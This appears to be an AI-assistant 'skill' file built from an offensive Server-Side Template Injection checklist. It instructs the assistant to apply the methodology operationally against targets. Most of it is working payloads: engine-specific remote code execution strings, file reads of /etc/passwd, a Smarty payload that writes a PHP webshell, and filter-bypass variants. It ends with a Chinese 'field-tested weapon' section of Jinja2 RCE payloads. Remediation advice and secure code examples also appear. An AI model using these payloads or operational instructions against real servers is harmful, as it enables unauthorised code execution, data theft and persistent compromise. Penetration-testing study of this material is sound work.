---
name: offensive-ssti
description: 'Server-Side Template Injection testing checklist: template engine identification
  (Jinja2, Twig, Freemarker, Pebble, Velocity), polyglot detection payloads, engine-specific
  RCE payloads, blind SSTI, and filter bypass. Use when testing web apps for template
  injection vulnerabilities.'
---

# SKILL: Server-Side Template Injection (SSTI)

## Metadata
- **Skill Name**: ssti
- **Folder**: offensive-ssti
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/ssti.md

## Description
Server-Side Template Injection testing checklist: template engine identification (Jinja2, Twig, Freemarker, Pebble, Velocity), polyglot detection payloads, engine-specific RCE payloads, blind SSTI, and filter bypass. Use when testing web apps for template injection vulnerabilities.

## Trigger Phrases
Use this skill when the conversation involves any of:
`SSTI, server-side template injection, Jinja2, Twig, Freemarker, Pebble, Velocity, template injection, template RCE, polyglot payload, template engine, blind SSTI`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Server-Side Template Injection (SSTI)

Template engines are software used to generate dynamic web pages. When user input is unsafely embedded into templates, server-side template injection (SSTI) can occur, potentially leading to Remote Code Execution (RCE).

## Shortcut

- Look for all locations where user input is reflected or used in the response (URL parameters, POST data, HTTP headers, JSON data, etc.).
- Inject template syntax characters/polyglots like `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}` into inputs. Check for errors, mathematical evaluation (e.g., `49` instead of `7*7`), or missing/changed reflections.
- Verify server-side evaluation (e.g., math works) vs. client-side XSS.
- Use engine-specific syntax (e.g., `${7/0}`, `{{7/0}}`, `<%= 7/0 %>`), known variable names (`{{config}}`, `{$smarty}`), or error messages to identify the template engine (use a decision tree like PortSwigger's or HackTricks').
- Look up payloads specific to the identified engine and backend language.
- Use engine-specific payloads (see Methodologies) to read files, execute commands, access internal data, or escape sandboxes.
- Create a non-destructive proof of concept (e.g., `touch ssti_poc_by_YOUR_NAME.txt` via RCE).

## Mechanisms

Server-Side Template Injection (SSTI) occurs when attacker-controlled input is embedded unsafely into a server-side template. Instead of treating the input as data, the template engine executes it as part of the template's code. This allows injecting template directives to execute arbitrary code, access server data, or perform actions as the application.

**Root Cause:** Concatenating or directly rendering user input within a template string without proper sanitization or using insecure template functions.

- Misusing “helper” APIs that compile raw strings at runtime, such as `render_template_string`, `Template::render_inline`, or `Template.compile`, which appear safe but execute attacker‑supplied data.

### Vulnerable Example 1 (Simple Jinja2)

The following program takes user input and concatenates it directly into a template string:

```python
# Assume user_input comes from an HTTP request parameter
from jinja2 import Template
tmpl = Template("<html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```

If `user_input` is `{{1+1}}`, the engine executes the expression:

```html
<html>
  <h1>The user's name is: 2</h1>
</html>
```

### Vulnerable Example 2 (Flask/Jinja2)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    # Vulnerable: Directly renders user input from 'user' query parameter
    if request.args.get('user'):
        return render_template_string('Welcome ' + request.args.get('user'))
    else:
        return render_template_string('Hello World!')

# Attacker URL: http://<server>/?user={{7*7}}
# Response: Welcome 49
```

### Secure Example (Flask/Jinja2)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    # Secure: Passes user input as a variable to the template
    if request.args.get('user'):
        # The template engine treats 'username' as data, not code
        return render_template_string('Welcome {{ username }}', username=request.args.get('user'))
    else:
        # ...
```

## Hunt

### Preparation

- Identify all user-controlled input points: URL parameters, POST data, HTTP headers (Referer, User-Agent, custom headers), JSON keys/values, etc.
- Use tools like `waybackurls` and `qsreplace` to generate fuzzing lists for parameters:
  ```bash
  waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
  ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/ -mr "ssti81"
  # Check Burp Repeater/Logger++ for responses containing the evaluated result (e.g., 81)
  ```

### Detection

- Initial Fuzzing: Inject basic polyglots: `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}`, `${7*7}`, **quote‑less payloads** such as `{{[].__class__.__mro__[1]}}`.
- Observe Behavior:
  - Errors: Stack traces or specific error messages can reveal the template engine (e.g., Jinja2, Smarty, FreeMarker).
  - Evaluation: Input like `{{7*7}}` becomes `49`.
  - Blank Output: The payload might be processed and removed if invalid or if it performs an action without output.
  - No Change: Input reflected exactly as provided; likely not vulnerable (or requires different syntax).
- Differentiate from XSS: Ensure the evaluation happens server-side, not client-side. `${7*7}` evaluating to `49` strongly suggests SSTI.

### Identification

#### Engine-Specific Payloads

Use a systematic approach based on the initial observations or a decision tree ([PortSwigger, updated July 2024](https://portswigger.net/research/server-side-template-injection), [Medium](https://miro.medium.com/v2/resize:fit:1100/format:webp/1%2A35XwCGeYeKYmeaU8rdkSdg.jpeg)).

#### Additional Common Engines (2024‑2025)

| Engine                           | Fingerprint                                         | Simple RCE / Info payload                                         |
| -------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------- |
| **Mako** (Python/Pyramid)        | Error message containing `mako.exceptions`          | `${self.module.os.popen('id').read()}`                            |
| **Blade** (Laravel 11)           | `Undefined variable` or `@dd($loop)` dumps          | `{!!\\Illuminate\\Support\\Facades\\Artisan::call('about')!!}`    |
| **Groovy / GSP**                 | Stack trace with `groovy.text.SimpleTemplateEngine` | `<% Class.forName('java.lang.Runtime').runtime.exec('id') %>`     |
| **Tera / Askama (Rust)**         | Files ending `.tera` / `.askama.rs`                 | No generic RCE yet; watch for logic injection                     |
| **EJS / Pug (Node)**             | `.ejs`, `.pug` templates                            | Often needs gadget via helpers/filters; prototype chains          |
| **Twig (PHP)**                   | Error mentions `Twig\\`                             | `{% for k,v in _self %}` info, RCE via unsafe extensions          |
| **Liquid** (Shopify/Ruby)        | `{{product.title}}`, errors mention `Liquid::`      | Limited by default; see Liquid-specific payloads below            |
| **Nunjucks** (Node/Mozilla)      | Mozilla's Jinja2 port, `.njk` templates             | Prototype chain to `Function` or `require`                        |
| **Handlebars** (Node)            | `{{this}}`, `{{@root}}` work                        | Limited RCE; requires unsafe helpers or prototype pollution       |
| **Thymeleaf 3.1+** (Java/Spring) | `th:text="${...}"`, Spring Boot stack traces        | `${T(java.lang.Runtime).getRuntime().exec('id')}` if SpEL enabled |

#### Variable Probing

Try injecting known variables for common frameworks: `{{config}}`, `{{settings}}`, `{{app.request.server.all|join(',')}}`, `{$smarty.version}`.

## Bypass Techniques

### Character Blacklist Bypass

- Use alternative syntax: `getattr(object, 'attribute')` instead of `object.attribute`. Use `{{request|attr('application')}}` instead of `{{request.application}}`.
- Use array/dictionary access: `request['application']` instead of `request.application`.
- Hex/Octal Encoding (if interpreted server-side): `request['\x5f\x5fglobals\x5f\x5f']` instead of `request['__globals__']`.
  ```python
  # Example: Bypass '.' and '_' using brackets and hex
  {{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
  # Example: Using attr() and hex (Source: HackTricks)
  {%raw %}{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()%}{{a}}{% endwith %}{% endraw %}
  ```
- URL Parameter manipulation (Source: HackTricks):
  - Pass attribute name: `?c=__class__` -> `{{ request|attr(request.args.c) }}`
  - Construct attribute name: `?f=%s%sclass%s%s&a=_` -> `{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}`
  - List join: `?l=a&a=_&a=_&a=class&a=_&a=_` -> `{{ request|attr(request.args.getlist(request.args.l)|join) }}`

> **Note:** The index for `subprocess.Popen` differs between CPython 3.11 and 3.12; enumerate `__subclasses__()` at runtime instead of hard‑coding.

### Keyword Filtering Bypass

- Concatenation: `'os'.__class__` -> `'o'+'s'`
- Using `request` object attributes or environment variables if keywords like `import` or `os` are blocked.
- Jinja2 Context Variables: Access `os` via `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}` or similar paths ([Source: Podalirius](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)).

### NET Reflection

Use reflection to load assemblies or invoke methods indirectly.
On modern ASP.NET Core, Razor limits direct process start; look for misused `Html.Raw`, custom tag helpers, or debug compilation flags.

### String-less Exploitation

Modern WAFs often filter quotes and common keyword tokens. 2025 research showed how to build strings from arithmetic or list indices.

```jinja
{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
```

For Node templating (EJS/Pug/Handlebars server-side), prefer prototype traversal to reach `Function` or `require` when helpers expose evaluation sinks:

```js
<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
```

### Recent CVEs (2024‑2025)

| CVE            | Affected component                          | Severity | Fixed in              |
| -------------- | ------------------------------------------- | -------- | --------------------- |
| CVE‑2024‑22195 | Jinja2 sandbox / `xmlattr` filter bypass    | High     | 3.1.3                 |
| CVE‑2024‑46507 | Yeti threat‑intel platform SSTI → RCE       | Critical | 1.6.2                 |
| Various (2024) | Atlassian Confluence widgets, CrushFTP, HFS | Critical | See vendor advisories |

### Automated Scanning & CI Integration

- **nuclei** and **semgrep** include up‑to‑date SSTI rules; integrate them into pull‑request checks.
- GitHub code‑scanning query pack “SSTI” (released 2024‑10) covers Python, PHP, Go.
- Add a CI gate blocking merges on raw `render_template_string` or `.format()` inside templates.

## Vulnerabilities

Common vulnerable patterns include:

- Direct Rendering: `render_template_string("Hello " + user_input)`
- Unsafe Variable Usage: `{{ unsafe_variable }}` where `unsafe_variable` contains template code.
- Framework-Specific Functions: Using functions known to be dangerous if processing user input (consult framework documentation).

## Methodologies

### Tools

**Active Exploitation:**

- **tplmap**: `python tplmap.py -u 'http://www.target.com/page?name=John*'` ([https://github.com/epinna/tplmap](https://github.com/epinna/tplmap))
- **SSTImap**: `python3 sstimap.py -u "https://example.com/page?name=John" -s`
- **TInjA**: `tinja url -u "http://example.com/?name=Kirlia"`
- **crithit** – SSTI‑centric fuzzer supporting Go/Tera, Blade, and Mako (2024)

**Burp Suite Extensions:**

- **Template Injector** – maintained fork replacing TemplateTester
- **Server Side Template Injection** - Active scanner checks
- **Param Miner** - Discover hidden parameters that might accept template input

**Scanning & Detection:**

- **nuclei** (`templates/ssti-*`) – fast HTTP scanner with updated SSTI signatures (2024-2025)
- **semgrep** with SSTI rulesets – Static analysis for template injection vulnerabilities
- **GitHub CodeQL** "SSTI" query pack (2024-10) – Covers Python, PHP, Go

**Framework-Specific:**

- **Jinja2 Sandbox Escape Tools** - Testing Jinja2 sandboxed environments
- **Node Template Tester** - EJS/Pug/Handlebars/Nunjucks testing suite

### Manual Testing & Exploitation Payloads

- Generic/Polyglot:
  - `${{<%[%'"}}%\.`
  - `{{7*7}}` -> `49`
  - `{{7*'7'}}` -> `7777777`
  - `{{ '7'*7 }}` (Jinja2) -> `7777777`
  - `@(1+2)` (.NET Razor) -> `3`
- Jinja2 (Python / Flask):
  - Debug/Info: `{{config}}`, `{{self}}`, `{{settings.SECRET_KEY}}`, `{% debug %}` (Requires debug extension)
  - List Subclasses: `{{ [].__class__.__base__.__subclasses__() }}` , `{{ ''.__class__.__mro__[1].__subclasses__() }}` (Index 1 or 2 depending on Python version)
  - Recover `object` Class: `{{ ''.__class__.__mro__[1] }}` (or `[2]`), `{{ ''.__class__.__base__ }}`
  - Find File Class: Iterate through subclasses list or guess index, e.g., `[40]` on some systems.
  - Read File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}` (Index varies)
  - RCE (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}` (Find `subprocess.Popen` index, e.g., `396`)
  - RCE (Common - via `__globals__`): `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - RCE (via `request` object - `__globals__`): `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - RCE (via `config` object - `__globals__`): `{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}`
  - RCE (Alternative via `__globals__` search): `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}` (Search for a class with `_module` attribute)
  - RCE (via `config` and `import_string`): `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}`
  - RCE (via `request` and hex/brackets bypass): `{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}`
  - Write File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evil', 'w').write('hello') }}` (Index varies)
  - Write Evil Config & RCE:
    ```python
    # Write config
    {{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
    # Load config
    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
    # Execute
    {{ config['RUNCMD']('id',shell=True) }}
    ```
  - Avoid HTML Encoding: `{{'<script>alert(1)</script>'|safe}}`
  - Loop: `{%raw %}{% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}{% endraw %}`
- FreeMarker (Java):
  - RCE: `<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }`
  - RCE: `${"freemarker.template.utility.Execute"?new()("id")}`
  - File Read: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` (May require adjustments)
  - Info: `${class.getResource("").getPath()}`, `${T(java.lang.System).getenv()}`
- Smarty (PHP):
  - `{$smarty.version}`
  - `{php}echo `id`;{/php}` (If PHP tag enabled)
  - `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` (Write webshell)
  - `{{7*7}}`, `{{7*'7'}}`
  - `{{dump(app)}}` (Symfony)
  - `"{{'/etc/passwd'|file_excerpt(1,30)}}"@` (Twig)
- Velocity (Java):
  - `#set($str=$class.inspect("java.lang.String").type)`
  - `#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))`
  - `$ex.waitFor()`
  - `#set($out=$ex.getInputStream()) ... #foreach ... $str.valueOf($chr.toChars($out.read())) ... #end` (Read command output)
- Ruby (ERB, Slim):
  - `<%= system("whoami") %>`
  - `<%= Dir.entries('/') %>`
  - `<%= File.open('/etc/passwd').read %>`
- Node.js (Various engines):
  - `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}`
  - Payloads often involve traversing prototypes (`this.__proto__`) to reach `constructor` and eventually `Function` or `require`. See PayloadAllTheThings / Hacker Recipes for detailed Node examples.
- ASP/.NET (Razor, etc.):
  - `@(1+2)` -> `3`
  - `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
  - `<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>` (Classic ASP)
- Perl (Template Toolkit):
  - `[% PERL %] ... perl code ... [% END %]`
  - `<%= perl code %>` or `<% perl code %>` (Depending on config)
- Go (`text/template`):
  - Potentially dangerous if methods allowing command execution are exposed to the template: `{{ .System "ls" }}`
  - `html/template` is generally safer against XSS but might still leak info if not used carefully.

### Comprehensive Payloads

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayloadBox - SSTI](https://github.com/payloadbox/ssti-payloadsb/ssti-server-side-template-injection/index.html)

## Chaining and Escalation

SSTI often leads directly to RCE, but can also be used for:

- **RCE:** Primary goal, gain shell access.
- **File Exfiltration:** Read sensitive files (`/etc/passwd`, `web.config`, source code, credentials).
- **Information Disclosure:** Dump environment variables, application configuration (`{{config}}`, `{{settings}}`), object properties, internal network paths.
- **Internal Network Access:** Use RCE to pivot, scan internal networks, or access internal services.
- **Privilege Escalation:** Combine RCE with local exploits if the web server runs with elevated privileges.
- **Data Exfiltration:** Send internal data to an attacker-controlled server (e.g., via HTTP requests or DNS exfiltration from within the template code).
- **SSRF pivot:** Some engines permit URL‑fetch filters (`{{''|fetch('http://...')}}`); leverage SSTI to query cloud‑metadata endpoints.

## Remediation Recommendations

- Never Render User Input Directly: The most critical step. Treat user input as data, not code.
- Use Safe Templating Practices:
  - Pass user data into templates using dedicated template variables (e.g., `render_template('page.html', user_data=user_input)`).
  - Use logic-less templates if possible.
- Sanitize and Validate: If rendering user input is unavoidable (e.g., CMS), rigorously sanitize it. Remove or escape all template syntax characters (`{`, `}`, `$`, `%`, `<`, `>`, etc.). Use allow-lists for safe HTML if needed.
- Use Sandboxed Environments: Configure the template engine's sandbox if available and effective for the specific engine. Be aware that sandboxes can often be bypassed.
- Choose Safer Engines: Prefer engines designed for security, like Go's `html/template` over `text/template` for HTML output, as it provides context-aware auto-escaping.
- Principle of Least Privilege: Run the web application process with minimal privileges.
- Input Validation: Validate input against expected formats (e.g., email, number) before it reaches the template layer.
- Patch management: track and apply security updates for template engines (see Recent CVEs).
- Harden runtime: enable seccomp/AppArmor or gVisor so that even a successful RCE has minimal kernel attack surface.
- CI guardrails: block usage of dangerous APIs (e.g., `render_template_string`, `Template.compile`, `eval` filters) via linters/semgrep; add approve‑list of safe helpers
- For Node: disable `with` in EJS, avoid `compileDebug`, and run with `vm` sandbox only when fully locked down (no `require` or `Function` reachable)


---

# 实测武器：Jinja2 SSTI RCE（TSec 2026-08-03 a-11 实测）

```bash
# 后台模板参数注入
{{ config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag.txt').read() }}
# 无 os 时变体
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

- **响应特征**：渲染页出现命令输出
- **前置**：先确认模板引擎（Jinja2/Twig/FreeMarker），再选对应 payload
